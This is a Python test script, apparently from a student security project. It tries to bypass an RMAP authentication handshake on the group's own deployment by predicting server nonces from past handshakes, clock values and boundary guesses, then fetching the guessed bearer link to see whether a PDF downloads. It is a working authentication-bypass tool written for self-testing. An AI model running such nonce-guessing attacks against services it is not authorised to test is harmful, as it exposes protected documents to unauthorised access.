#!/usr/bin/env python3
"""Try targeted RMAP link guesses on the group's own deployment.

This client has no registered private key. It chooses the client nonce, starts
one challenge, and tries several candidate server nonces against that challenge.
"""

from __future__ import annotations

import argparse
import json
import math
import re
import secrets
import sys
from datetime import datetime, timezone
from pathlib import Path

import pgpy
import requests

from rmap_nonce_samples import Sample, load_samples, time_matches


MAX_U64 = (1 << 64) - 1
MAX_CLOCK_CANDIDATES = 64


def parse_u64(value: str) -> int:
    """Accept a decimal number or one prefixed with 0x."""
    try:
        number = int(value, 0)
    except ValueError as exc:
        raise argparse.ArgumentTypeError("expected a decimal or 0x hex integer") from exc
    if not 0 <= number <= MAX_U64:
        raise argparse.ArgumentTypeError("nonce must fit in 64 bits")
    return number


def parse_args() -> argparse.Namespace:
    """Read the target and candidate strategy from the command line."""
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", required=True, help="Your own deployment's base URL")
    parser.add_argument(
        "--server-public-key", required=True, type=Path, help="Your server's public PGP key"
    )
    parser.add_argument("--identity", default="Group_02", help="Your registered identity")
    parser.add_argument("--client-nonce", type=parse_u64, default=None)
    parser.add_argument(
        "--previous-server-nonce",
        type=parse_u64,
        help="The last 16 hex digits of an earlier authorized link, prefixed by 0x",
    )
    parser.add_argument(
        "--guess", type=parse_u64, action="append", default=[], help="Extra server nonce guess"
    )
    parser.add_argument(
        "--samples",
        type=Path,
        help="Completed-handshake JSONL from rmap_nonce_samples.py collect",
    )
    parser.add_argument(
        "--max-guesses",
        type=int,
        default=128,
        help="Maximum number of distinct guesses to send (default: 128)",
    )
    parser.add_argument(
        "--max-clock-candidates",
        type=int,
        default=MAX_CLOCK_CANDIDATES,
        help="Maximum time values to try for one clock rule (default: 64)",
    )
    parser.add_argument("--timeout", type=float, default=20.0)
    parser.add_argument(
        "--verbose", action="store_true", help="Print the complete encrypted requests"
    )
    return parser.parse_args()


def add_candidate(candidates: dict[int, set[str]], nonce: int, reason: str) -> None:
    """Keep one copy of each guess and retain every reason for trying it."""
    if 0 <= nonce <= MAX_U64:
        candidates.setdefault(nonce, set()).add(reason)


def prior_candidates(args: argparse.Namespace) -> dict[int, set[str]]:
    """Build explicit guesses and simple boundary-value checks."""
    candidates: dict[int, set[str]] = {}
    for guess in args.guess:
        add_candidate(candidates, guess, "manual")
    if args.previous_server_nonce is not None:
        old = args.previous_server_nonce
        add_candidate(candidates, old, "previous nonce")
        add_candidate(candidates, (old - 1) & MAX_U64, "previous - 1")
        add_candidate(candidates, (old + 1) & MAX_U64, "previous + 1")
    for guess in (0, 1, 2, MAX_U64):
        add_candidate(candidates, guess, "boundary value")
    return candidates


def sample_candidates(
    candidates: dict[int, set[str]], samples: list[Sample], client_nonce: int
) -> None:
    """Convert exact patterns in earlier handshakes into new candidates."""
    if not samples:
        return
    server_nonces = [sample.server_nonce for sample in samples]
    last = server_nonces[-1]

    if len(samples) >= 3:
        differences = [
            (right - left) & MAX_U64
            for left, right in zip(server_nonces, server_nonces[1:])
        ]
        if len(set(differences)) == 1:
            add_candidate(
                candidates, (last + differences[0]) & MAX_U64, "fixed step"
            )

        xor_values = {
            sample.client_nonce ^ sample.server_nonce for sample in samples
        }
        if len(xor_values) == 1:
            add_candidate(
                candidates, client_nonce ^ next(iter(xor_values)), "fixed client/server XOR"
            )
        offsets = {
            (sample.server_nonce - sample.client_nonce) & MAX_U64
            for sample in samples
        }
        if len(offsets) == 1:
            add_candidate(
                candidates,
                (client_nonce + next(iter(offsets))) & MAX_U64,
                "fixed client/server offset",
            )

    add_candidate(candidates, last, "last observed nonce")
    add_candidate(candidates, (last - 1) & MAX_U64, "last observed - 1")
    add_candidate(candidates, (last + 1) & MAX_U64, "last observed + 1")
    for nonce in reversed(server_nonces):
        add_candidate(candidates, nonce, "previously observed nonce")

    varying_mask = 0
    for nonce in server_nonces[1:]:
        varying_mask |= nonce ^ server_nonces[0]
    if len(samples) >= 2:
        print(
            f"Observed {64 - varying_mask.bit_count()} fixed bit positions; "
            "this alone does not give a unique guess."
        )
    if len(samples) >= 3 and all(nonce < 1 << 32 for nonce in server_nonces):
        print("All observed nonces fit in 32 bits; this alone does not give a unique guess.")


def clock_candidates(
    candidates: dict[int, set[str]],
    samples: list[Sample],
    started_at: datetime,
    challenge_at: datetime,
    max_clock_candidates: int,
) -> None:
    """Try direct Unix-clock patterns only when the current window is small."""
    if len(samples) < 3:
        return
    for label, scale in (
        ("seconds", 1),
        ("milliseconds", 1000),
        ("microseconds", 1_000_000),
    ):
        if time_matches(samples, scale) != len(samples):
            continue
        first = math.floor(started_at.timestamp() * scale)
        last = math.ceil(challenge_at.timestamp() * scale)
        size = last - first + 1
        if size > max_clock_candidates:
            print(
                f"Unix {label} matched earlier samples, but the current "
                f"window has {size} values; skipped this clock rule."
            )
            continue
        for value in range(first, last + 1):
            add_candidate(candidates, value, f"Unix {label} during challenge")


def encrypt_for_server(server_public_key: pgpy.PGPKey, body: dict) -> dict:
    """Make the documented RMAP payload using public-key encryption only."""
    encrypted = server_public_key.encrypt(pgpy.PGPMessage.new(json.dumps(body)))
    payload = "".join(
        line
        for line in str(encrypted).splitlines()
        if re.fullmatch(r"[A-Za-z0-9+/]+={0,2}", line)
    )
    if not payload:
        raise RuntimeError("PGP encryption produced no RMAP payload")
    return {"payload": payload}


def check_response(response: requests.Response) -> None:
    """Reject redirects that could disguise an endpoint or login failure."""
    if 300 <= response.status_code < 400:
        raise RuntimeError(f"Unexpected redirect from {response.url}")


def start_challenge(
    session: requests.Session,
    args: argparse.Namespace,
    server_public_key: pgpy.PGPKey,
    client_nonce: int,
    base_url: str,
) -> tuple[datetime, datetime]:
    """Start one challenge and record its possible server-nonce time window."""
    msg1 = encrypt_for_server(
        server_public_key, {"identity": args.identity, "nonceClient": client_nonce}
    )
    if args.verbose:
        print(f"POST /api/rmap-initiate {json.dumps(msg1)}")
    started_at = datetime.now(timezone.utc)
    response1 = session.post(
        base_url + "/api/rmap-initiate",
        json=msg1,
        timeout=args.timeout,
        allow_redirects=False,
    )
    challenge_at = datetime.now(timezone.utc)
    check_response(response1)
    print(f"POST /api/rmap-initiate -> HTTP {response1.status_code}")
    if response1.status_code != 200:
        raise RuntimeError(
            f"Initiation failed with HTTP {response1.status_code}: {response1.text}"
        )
    response1_body = response1.json()
    if not isinstance(response1_body, dict) or not isinstance(
        response1_body.get("payload"), str
    ):
        raise RuntimeError("Initiation returned no encrypted RMAP challenge")
    return started_at, challenge_at


def build_candidates(
    args: argparse.Namespace,
    samples: list[Sample],
    client_nonce: int,
    started_at: datetime,
    challenge_at: datetime,
) -> dict[int, set[str]]:
    """Combine manual and learned guesses, then apply the requested limit."""
    candidates = prior_candidates(args)
    sample_candidates(candidates, samples, client_nonce)
    clock_candidates(
        candidates, samples, started_at, challenge_at, args.max_clock_candidates
    )
    if len(candidates) > args.max_guesses:
        print(
            f"Generated {len(candidates)} distinct candidates; "
            f"trying the first {args.max_guesses}."
        )
        candidates = dict(list(candidates.items())[: args.max_guesses])
    print(
        f"Client nonce: 0x{client_nonce:016x}; "
        f"server nonce guesses: {len(candidates)}"
    )
    return candidates


def fetch_candidate(
    session: requests.Session, args: argparse.Namespace, token: str
) -> tuple[int, str, bool, str]:
    """Check whether the guessed bearer link retrieves a PDF."""
    with session.get(
        args.url.rstrip("/") + "/api/get-version/" + token,
        timeout=args.timeout,
        allow_redirects=False,
        stream=True,
    ) as download:
        check_response(download)
        if download.status_code == 200:
            first_bytes = next(download.iter_content(chunk_size=5), b"")
            return (
                download.status_code,
                download.headers.get("Content-Type", ""),
                first_bytes.startswith(b"%PDF-"),
                "",
            )
        return (
            download.status_code,
            download.headers.get("Content-Type", ""),
            False,
            download.text,
        )


def try_candidate(
    session: requests.Session,
    args: argparse.Namespace,
    server_public_key: pgpy.PGPKey,
    client_nonce: int,
    candidate: tuple[int, set[str]],
) -> int:
    """Return 0 for rejection, 1 for link access, or 2 for uncertainty."""
    guessed_nonce, reasons = candidate
    base_url = args.url.rstrip("/")
    token = f"{client_nonce:016x}{guessed_nonce:016x}"
    msg2 = encrypt_for_server(server_public_key, {"nonceServer": guessed_nonce})
    if args.verbose:
        print(f"POST /api/rmap-get-link {json.dumps(msg2)}")
    response2 = session.post(
        base_url + "/api/rmap-get-link",
        json=msg2,
        timeout=args.timeout,
        allow_redirects=False,
    )
    check_response(response2)

    fetch_status, content_type, starts_with_pdf, download_response = fetch_candidate(
        session, args, token
    )

    print(
        json.dumps(
            {
                "guessed_server_nonce": f"0x{guessed_nonce:016x}",
                "reasons": sorted(reasons),
                "candidate_link": token,
                "get_link_status": response2.status_code,
                "get_link_response": response2.text,
                "download_status": fetch_status,
                "download_response": download_response,
                "download_content_type": content_type,
                "download_is_pdf": starts_with_pdf,
            },
            sort_keys=True,
        )
    )
    if response2.status_code == 200 or fetch_status == 200:
        print("A guessed nonce led to link issuance or a download.")
        return 1
    if response2.status_code != 400 or fetch_status != 404:
        print("Unexpected response; the test result is inconclusive.")
        return 2
    return 0


def main() -> int:
    """Try all candidates against one pending challenge and report the result."""
    args = parse_args()
    if args.timeout <= 0:
        raise SystemExit("--timeout must be positive")
    if args.max_guesses < 1:
        raise SystemExit("--max-guesses must be positive")
    if args.max_clock_candidates < 1:
        raise SystemExit("--max-clock-candidates must be positive")
    if not args.server_public_key.is_file():
        raise SystemExit(f"Public key not found: {args.server_public_key}")

    server_public_key, _ = pgpy.PGPKey.from_file(str(args.server_public_key))
    if not server_public_key.is_public:
        raise SystemExit("--server-public-key must contain a public key")

    client_nonce = args.client_nonce
    if client_nonce is None:
        client_nonce = secrets.randbits(64)

    base_url = args.url.rstrip("/")

    try:
        samples = load_samples(args.samples) if args.samples is not None else []
        with requests.Session() as session:
            started_at, challenge_at = start_challenge(
                session, args, server_public_key, client_nonce, base_url
            )
            candidates = build_candidates(
                args, samples, client_nonce, started_at, challenge_at
            )
            for candidate in candidates.items():
                outcome = try_candidate(
                    session,
                    args,
                    server_public_key,
                    client_nonce,
                    candidate,
                )
                if outcome:
                    return outcome
    except (OSError, ValueError, requests.RequestException, RuntimeError) as exc:
        print(f"RMAP link-guess test could not complete: {exc}", file=sys.stderr)
        return 2

    print("No candidate worked; this result covers only the listed guesses.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
